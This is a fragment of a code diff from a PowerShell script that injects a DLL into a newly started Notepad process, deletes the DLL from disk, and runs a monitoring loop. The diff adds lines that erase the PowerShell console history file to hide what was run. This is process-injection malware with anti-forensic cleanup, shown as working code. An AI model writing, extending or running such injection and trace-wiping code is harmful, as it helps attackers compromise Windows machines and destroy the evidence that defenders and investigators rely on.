@@ -85,10 +85,17 @@ function Inject-IntoNewNotepad {
         Start-Sleep -Seconds 2
         Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
         Write-Host "[*] DLL deleted from disk."
+
+        # === Clear PowerShell history without deleting file ===
+        $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+        Set-Content -Path $historyPath -Value ""
+        Write-Host "[*] Cleared ConsoleHost_history.txt"
+
     } catch {
         Write-Host "[-] Injection failed: $($_.Exception.Message)"
     }
 }
+
 
 # === Continuous Monitoring Loop ===
 Write-Host "`n[*] Monitoring started... (Press Ctrl+C to stop)"
